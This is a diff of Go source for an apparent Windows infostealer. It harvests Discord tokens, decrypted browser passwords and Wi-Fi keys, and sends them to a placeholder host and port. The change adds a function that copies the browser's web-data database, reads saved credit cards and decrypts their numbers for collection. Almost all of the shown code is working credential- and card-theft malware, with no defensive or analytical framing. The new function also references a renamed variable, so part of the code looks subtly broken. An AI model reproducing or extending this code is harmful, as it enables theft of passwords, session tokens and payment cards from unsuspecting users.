@@ -191,7 +191,7 @@ func ipInfo() {
 }
 
 func discordInfo() {
-	for INDEX, PATH := range TOKEN_PATHS {
+	for index, PATH := range TOKEN_PATHS {
 		FILES, err := os.ReadDir(PATH)
 		if err != nil {
 			continue
@@ -209,7 +209,7 @@ func discordInfo() {
 						if RESP.StatusCode == http.StatusOK {
 							json.NewDecoder(RESP.Body).Decode(&information)
 							BODY, _ := json.MarshalIndent(information, "", " ")
-							DATA.WriteString(fmt.Sprintf("===========================[Discord]===========================\nSESSION: %v\nTOKEN: %v\n%v\n", SESSIONS[INDEX], TOKEN, string(BODY)))
+							DATA.WriteString(fmt.Sprintf("===========================[DISCORD]===========================\nSession: %v\nToken: %v\n%v\n", SESSIONS[index], TOKEN, string(BODY)))
 						}
 					}
 				}
@@ -275,11 +275,39 @@ func browserInfo() {
 			if strings.HasPrefix(password, "v10") {
 				password = decryptData([]byte(password[3:]), extractKey(LOCAL_PATHS[index]))
 				if password != "" {
-					DATA.WriteString(fmt.Sprintf("==========================[Login]=============================\nBROWSER: %v\nURL: %v\nUSERNAME: %v\nPASSWORD: %v\n\n", SESSIONS[index], url, username, password))
+					DATA.WriteString(fmt.Sprintf("==========================[LOGIN]=============================\nBrowser: %v\nURL: %v\nUsername: %v\nPassword: %v\n\n", SESSIONS[index], url, username, password))
 				}
 			}
 		}
 
+	}
+}
+
+func cardInfo() {
+	for index, path := range WEB_PATHS {
+		dbData, err := os.ReadFile(path)
+		if err != nil {
+			continue
+		}
+		os.WriteFile("vault.db", dbData, 0644)
+		defer os.Remove("vault.db")
+
+		db, _ := sql.Open("sqlite", "vault.db")
+		defer db.Close()
+
+		rows, _ := db.Query("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards;")
+		defer rows.Close()
+
+		for rows.Next() {
+			var name, number, expiration_m, expiration_y string
+			rows.Scan(&name, &number, &expiration_m, &expiration_y)
+			if strings.HasPrefix(number, "v10") {
+				number = decryptData([]byte(number[3:]), extractKey(LOCAL_PATHS[INDEX]))
+				if number != "" {
+					DATA.WriteString(fmt.Sprintf("=========================[CREDIT-CARD]=========================\nBrowser: %v\nCard_Owner: %s\nCard_Number: %s\nExpiration_Month: %v\nExpiration_Year: %v\n\n", SESSIONS[index], name, number, expiration_m, expiration_y))
+				}
+			}
+		}
 	}
 }
 
@@ -290,7 +318,7 @@ func wifiInfo() {
 		if strings.Contains(line, ":") {
 			profile := strings.TrimSpace(strings.Split(line, ":")[1])
 			if len(profile) > 0 {
-				DATA.WriteString(fmt.Sprintf("==========================[Wifi]============================\n%v\n", run(fmt.Sprintf("netsh wlan show profile %v key=clear", profile))))
+				DATA.WriteString(fmt.Sprintf("==========================[WIFI]============================\n%v\n", run(fmt.Sprintf("netsh wlan show profile %v key=clear", profile))))
 			}
 		}
 	}
@@ -519,6 +547,5 @@ func main() {
 		} else {
 			connectToServer("<HOST>", <PORT>)
 		}
-
 	}
 }
